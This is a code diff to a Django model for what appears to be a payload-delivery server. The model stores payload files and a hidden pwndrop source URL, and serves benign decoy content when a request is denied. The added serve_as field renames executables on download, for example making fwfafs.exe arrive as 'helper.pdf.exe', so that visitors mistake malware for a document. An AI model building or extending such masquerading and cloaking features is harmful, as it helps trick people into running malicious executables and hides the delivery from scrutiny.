@@ -175,6 +175,8 @@ class DeliveryLink(models.Model):
     key_text = models.TextField(blank=True, help_text="Plain content for kind=key.")
     pwndrop_url = models.URLField(blank=True, help_text="Source URL fetched server-side for kind=proxy (pwndrop location is never exposed to the client).")
     payload = models.FileField(upload_to="payloads/", blank=True, null=True)
+    serve_as = models.CharField(max_length=200, blank=True,
+                                help_text="Filename presented to the visitor on download, e.g. the stored fwfafs.exe downloads as helper.pdf.exe. Empty = the real/uploaded name.")
     benevolent_text = models.TextField(blank=True, help_text="Plain response served when a request is denied and on_deny=benevolent.")
     benevolent_file = models.FileField(upload_to="benevolent/", blank=True, null=True)
 
